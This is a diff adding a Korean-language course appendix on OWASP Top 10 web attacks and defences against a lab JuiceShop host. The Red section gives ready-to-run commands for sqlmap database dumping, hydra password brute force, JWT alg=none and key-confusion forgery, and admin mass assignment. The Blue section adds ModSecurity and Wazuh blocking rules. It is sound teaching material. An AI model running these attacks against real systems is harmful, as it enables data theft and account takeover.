@@ -771,3 +771,207 @@ graph LR
 
 **학생 액션**: DVWA 에 sqlmap 시도 → WAF 룰 적중률.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 03 웹 공격)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 | 명령 |
+|------|----------|---------|------|
+| s1 | SQLi 자동 | **sqlmap** | `sqlmap -u "url?id=1" --batch --dbs` |
+| s2 | SQLi POST JSON | sqlmap | `sqlmap -u url --method=POST --data='{...}' -p email` |
+| s3 | XSS 자동 | **XSStrike** / dalfox | `xsstrike.py -u "url?q=test"` |
+| s4 | XSS Stored | dalfox | `dalfox url url --silence` |
+| s5 | 인증 brute | hydra | `hydra -L u.txt -P p.txt http-post-form` |
+| s6 | CSRF | xsrfprobe | `xsrfprobe -u url` |
+| s7 | JWT alg=none | jwt_tool | `jwt_tool $TOKEN -X a` |
+| s8 | OWASP Top 10 종합 | nuclei + 위 도구 | 통합 스크립트 |
+
+### 학생 환경 준비
+
+```bash
+# Red 측
+ssh ccc@192.168.0.112
+sudo apt install -y sqlmap hydra dirb wapiti
+
+# XSStrike
+git clone https://github.com/s0md3v/XSStrike ~/XSStrike
+pip install -r ~/XSStrike/requirements.txt
+
+# dalfox (Go, modern XSS)
+go install github.com/hahwul/dalfox/v2@latest
+
+# jwt_tool
+git clone https://github.com/ticarpi/jwt_tool ~/jwt_tool
+pip install -r ~/jwt_tool/requirements.txt
+
+# CSRF
+pip install xsrfprobe
+
+# Burp Suite Community (수동 검증)
+# https://portswigger.net/burp/communitydownload
+```
+
+### Red 측 — OWASP Top 10 자동 공격
+
+```bash
+# === A01 — Broken Access Control ===
+# IDOR 자동 fuzz
+ffuf -w userlist.txt -u "http://10.20.30.80:3000/api/Users/FUZZ" \
+    -H "Authorization: Bearer $TOKEN" -mc 200
+
+# === A02 — Cryptographic Failures ===
+# TLS 점검 (week02 testssl.sh 재사용)
+testssl.sh https://10.20.30.100:443
+
+# === A03 — Injection (SQLi/XSS/Command) ===
+
+# 3-1) SQLi (sqlmap 자동)
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+    --batch --random-agent --risk=3 --level=5 --dbs
+
+# JuiceShop 로그인 SQLi (POST JSON)
+sqlmap -u http://10.20.30.80:3000/rest/user/login \
+    --method=POST --data='{"email":"x","password":"x"}' \
+    --headers='Content-Type: application/json' \
+    -p email --batch --level=5
+
+# DB schema 자동 추출
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+    --batch -D Users -T users --dump
+
+# 3-2) XSS (XSStrike 자동)
+python3 ~/XSStrike/xsstrike.py \
+    -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+    --crawl --skip-dom
+
+# Stored XSS (dalfox)
+dalfox url "http://10.20.30.80:3000/api/Feedbacks" \
+    -d '{"comment":"DALFOX","rating":5}' \
+    --silence
+
+# 3-3) Command Injection
+nuclei -u http://10.20.30.80:3000 -tags command-injection
+commix --url "http://target/?cmd=ls" --batch
+
+# === A04 — Insecure Design ===
+# Mass assignment 시도
+curl -X POST http://10.20.30.80:3000/api/Users \
+    -H "Content-Type: application/json" \
+    -d '{"email":"hack@test.com","password":"x","role":"admin","isAdmin":true}'
+
+# === A05 — Security Misconfiguration ===
+nikto -h http://10.20.30.80:3000
+nuclei -u http://10.20.30.80:3000 -tags misconfig
+
+# === A06 — Vulnerable Components ===
+# 발견된 서비스의 CVE
+searchsploit "JuiceShop"
+searchsploit "Express 4"
+
+# === A07 — Authentication Failures ===
+# Brute force
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \
+    10.20.30.80 -s 3000 \
+    http-post-form '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:invalid' \
+    -t 4 -V
+
+# === A08 — Software Data Integrity ===
+# Subresource integrity 점검
+nuclei -u http://10.20.30.80:3000 -tags sri
+
+# === A09 — Logging Failures (Blue 측 점검) ===
+# Wazuh / Falco 가 위 모든 attack 을 log 했는가?
+sudo /var/ossec/bin/wazuh-control logtest
+sudo jq '.rule.description' /var/ossec/logs/alerts/alerts.json | sort | uniq -c
+
+# === A10 — SSRF ===
+# SSRFmap (week13 attack-advanced 본격)
+git clone https://github.com/swisskyrepo/SSRFmap ~/SSRFmap
+python3 ~/SSRFmap/ssrfmap.py -r req.txt -p url -m portscan
+```
+
+### JWT 공격 (jwt_tool)
+
+```bash
+# 1) 정상 로그인 → JWT 획득
+TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"student@test.com","password":"Test1234!"}' | \
+    jq -r '.authentication.token')
+
+# 2) JWT 자동 약점 점검
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -T
+
+# 3) alg=none 공격
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -X a \
+    -I -pc role -pv admin
+
+# 4) Secret brute (HS256)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -C \
+    -d /usr/share/wordlists/rockyou.txt
+
+# 5) Key confusion (RS256 → HS256)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk public.pem
+```
+
+### Blue 측 — 방어
+
+```bash
+# === ModSecurity OWASP CRS strict mode ===
+sudo a2enmod security2 headers
+# /etc/modsecurity/modsecurity.conf
+# SecRuleEngine On                 (DetectionOnly → On)
+# SecRequestBodyAccess On
+# SecResponseBodyAccess On
+
+# CRS 룰셋
+sudo cp /usr/share/modsecurity-crs/crs-setup.conf.example /etc/modsecurity/crs-setup.conf
+sudo ln -sf /usr/share/modsecurity-crs/rules /etc/modsecurity/rules
+
+# Custom strict 룰
+sudo tee /etc/modsecurity/custom-rules.conf > /dev/null << 'EOF'
+SecAction "id:90001,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=3"
+SecAction "id:90002,phase:1,nolog,pass,t:none,setvar:tx.executing_paranoia_level=3"
+EOF
+sudo systemctl restart apache2
+
+# === Wazuh frequency 룰 (반복 SQLi/XSS 차단) ===
+sudo tee -a /var/ossec/etc/rules/local_rules.xml << 'EOF'
+<rule id="100300" level="14" frequency="10" timeframe="60">
+  <if_matched_sid>31103</if_matched_sid>
+  <description>SQL injection attempts (10+ in 60s)</description>
+  <mitre><id>T1190</id></mitre>
+</rule>
+EOF
+
+# === fail2ban + nftables 자동 차단 ===
+# 위 Wazuh rule level 14 → AR 자동 호출
+# AR script:
+sudo tee /var/ossec/active-response/bin/auto-block-ip.sh << 'EOF'
+#!/bin/bash
+IP=$3
+ssh ccc@10.20.30.1 "sudo nft add element inet filter blocked '{ $IP }'"
+EOF
+sudo chmod +x /var/ossec/active-response/bin/auto-block-ip.sh
+```
+
+### 공격 vs 방어 매트릭스
+
+| OWASP Top 10 | Red 도구 | Blue 도구 |
+|-------------|---------|----------|
+| A01 Access | ffuf IDOR | ModSec + RBAC |
+| A02 Crypto | testssl.sh | TLS 1.3 강제 |
+| A03 SQLi | sqlmap | ModSec OWASP CRS rule 942 |
+| A03 XSS | XSStrike, dalfox | ModSec rule 941 + CSP |
+| A04 Design | curl mass assignment | OPA + input validation |
+| A05 Misconfig | nikto, nuclei | Lynis + OpenSCAP |
+| A06 Vuln Components | searchsploit | Trivy (week06) |
+| A07 Auth | hydra | fail2ban + Wazuh frequency |
+| A08 Integrity | nuclei sri | cosign + SRI hash |
+| A09 Logging | (Blue 점검) | Wazuh + audit |
+| A10 SSRF | SSRFmap | nftables egress filter |
+
+학생은 본 3주차에서 **Red (sqlmap + XSStrike + dalfox + hydra + jwt_tool + xsrfprobe + commix) ↔ Blue (ModSec + OWASP CRS + Wazuh + fail2ban + nftables)** 의 OWASP Top 10 자동 공방을 익힌다.
